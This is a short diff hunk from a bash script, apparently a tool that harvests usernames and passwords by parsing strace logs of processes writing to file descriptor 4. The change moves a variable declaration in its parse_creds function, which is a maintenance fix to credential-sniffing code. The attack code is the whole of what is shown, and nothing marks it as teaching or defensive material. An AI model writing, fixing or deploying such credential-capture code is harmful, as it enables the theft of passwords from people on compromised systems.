@@ -21,8 +21,8 @@ fi
 # Function to extract username and password(s) from strace logs
 function parse_creds () {
 	local i=0
+	local user=""
 	while IFS='' read -r line || [[ -n "$line" ]]; do
-		local user=""
 		# Get lines that write to file descriptor 4 and have a length greater than 5
 		if [[ "$line" == "write(4, "* ]] && (( $(echo "$line" | awk '{print $NF}') > 5 )); then
 			# Get the quoted string and remove the first four hex characters
